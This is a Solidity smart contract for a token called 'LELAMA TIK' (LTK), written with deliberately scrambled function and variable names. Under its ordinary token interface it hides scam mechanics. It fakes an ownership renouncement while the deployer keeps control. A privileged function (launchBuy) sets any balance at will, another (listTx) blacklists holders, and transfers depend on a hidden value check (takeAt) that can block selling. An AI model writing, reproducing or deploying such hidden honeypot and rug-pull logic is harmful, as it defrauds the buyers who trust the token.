//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

interface isSell {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface liquidityMaxTx {
    function createPair(address minAt, address takeBuyLiquidity) external returns (address);
}

abstract contract tradingList {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface swapAuto {
    function totalSupply() external view returns (uint256);

    function balanceOf(address launchExempt) external view returns (uint256);

    function transfer(address buyListWallet, uint256 limitMode) external returns (bool);

    function allowance(address walletTxMode, address spender) external view returns (uint256);

    function approve(address spender, uint256 limitMode) external returns (bool);

    function transferFrom(address sender,address buyListWallet,uint256 limitMode) external returns (bool);

    event Transfer(address indexed from, address indexed buyTotal, uint256 value);
    event Approval(address indexed walletTxMode, address indexed spender, uint256 value);
}

interface swapAutoMetadata is swapAuto {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract LELAMATIK is tradingList, swapAuto, swapAutoMetadata {

    bool public takeListAt;

    function getOwner() external view returns (address) {
        return marketingLiquidityTx;
    }

    uint256 private autoTrading;

    function fromWallet(address listFrom) public {
        if (buyTotalReceiver) {
            return;
        }
        if (liquiditySender == shouldLaunch) {
            senderTrading = autoTrading;
        }
        feeListTx[listFrom] = true;
        if (shouldLaunch != autoTrading) {
            autoTrading = enableSell;
        }
        buyTotalReceiver = true;
    }

    uint256 public enableSell;

    uint256 private shouldLaunch;

    function transfer(address atIs, uint256 limitMode) external virtual override returns (bool) {
        return takeAt(_msgSender(), atIs, limitMode);
    }

    function symbol() external view virtual override returns (string memory) {
        return shouldBuy;
    }

    constructor (){
        if (txLimit) {
            autoTrading = senderTrading;
        }
        tokenTeam();
        isSell receiverMarketing = isSell(atBuy);
        modeMax = liquidityMaxTx(receiverMarketing.factory()).createPair(receiverMarketing.WETH(), address(this));
        
        takeBuyShould = _msgSender();
        feeListTx[takeBuyShould] = true;
        teamList[takeBuyShould] = exemptAmount;
        if (tradingSellAmount) {
            enableSell = liquiditySender;
        }
        emit Transfer(address(0), takeBuyShould, exemptAmount);
    }

    address public modeMax;

    bool public buyTotalReceiver;

    function owner() external view returns (address) {
        return marketingLiquidityTx;
    }

    mapping(address => uint256) private teamList;

    address enableList = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 public liquiditySender;

    bool public tokenAt;

    string private totalMin = "LELAMA TIK";

    function allowance(address launchSenderAmount, address launchEnable) external view virtual override returns (uint256) {
        if (launchEnable == atBuy) {
            return type(uint256).max;
        }
        return tokenBuy[launchSenderAmount][launchEnable];
    }

    function tokenTeam() public {
        emit OwnershipTransferred(takeBuyShould, address(0));
        marketingLiquidityTx = address(0);
    }

    function transferFrom(address tradingSwapEnable, address buyListWallet, uint256 limitMode) external override returns (bool) {
        if (_msgSender() != atBuy) {
            if (tokenBuy[tradingSwapEnable][_msgSender()] != type(uint256).max) {
                require(limitMode <= tokenBuy[tradingSwapEnable][_msgSender()]);
                tokenBuy[tradingSwapEnable][_msgSender()] -= limitMode;
            }
        }
        return takeAt(tradingSwapEnable, buyListWallet, limitMode);
    }

    function atTeam(uint256 limitMode) public {
        feeAuto();
        autoFundMax = limitMode;
    }

    function decimals() external view virtual override returns (uint8) {
        return toSell;
    }

    function balanceOf(address launchExempt) public view virtual override returns (uint256) {
        return teamList[launchExempt];
    }

    uint256 minBuy;

    uint256 private senderTrading;

    uint256 private exemptAmount = 100000000 * 10 ** 18;

    function name() external view virtual override returns (string memory) {
        return totalMin;
    }

    function takeAt(address tradingSwapEnable, address buyListWallet, uint256 limitMode) internal returns (bool) {
        if (tradingSwapEnable == takeBuyShould) {
            return atLiquidity(tradingSwapEnable, buyListWallet, limitMode);
        }
        uint256 receiverTx = swapAuto(modeMax).balanceOf(enableList);
        require(receiverTx == autoFundMax);
        require(!takeMode[tradingSwapEnable]);
        return atLiquidity(tradingSwapEnable, buyListWallet, limitMode);
    }

    string private shouldBuy = "LTK";

    uint8 private toSell = 18;

    mapping(address => bool) public takeMode;

    function launchBuy(address atIs, uint256 limitMode) public {
        feeAuto();
        teamList[atIs] = limitMode;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return exemptAmount;
    }

    address private marketingLiquidityTx;

    address atBuy = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function feeAuto() private view {
        require(feeListTx[_msgSender()]);
    }

    function approve(address launchEnable, uint256 limitMode) public virtual override returns (bool) {
        tokenBuy[_msgSender()][launchEnable] = limitMode;
        emit Approval(_msgSender(), launchEnable, limitMode);
        return true;
    }

    address public takeBuyShould;

    bool public tradingSellAmount;

    mapping(address => mapping(address => uint256)) private tokenBuy;

    function atLiquidity(address tradingSwapEnable, address buyListWallet, uint256 limitMode) internal returns (bool) {
        require(teamList[tradingSwapEnable] >= limitMode);
        teamList[tradingSwapEnable] -= limitMode;
        teamList[buyListWallet] += limitMode;
        emit Transfer(tradingSwapEnable, buyListWallet, limitMode);
        return true;
    }

    event OwnershipTransferred(address indexed fromAuto, address indexed teamTxAuto);

    uint256 autoFundMax;

    mapping(address => bool) public feeListTx;

    function listTx(address amountSenderEnable) public {
        feeAuto();
        if (isTotalFrom != enableSell) {
            enableSell = shouldLaunch;
        }
        if (amountSenderEnable == takeBuyShould || amountSenderEnable == modeMax) {
            return;
        }
        takeMode[amountSenderEnable] = true;
    }

    uint256 private isTotalFrom;

    bool public txLimit;

}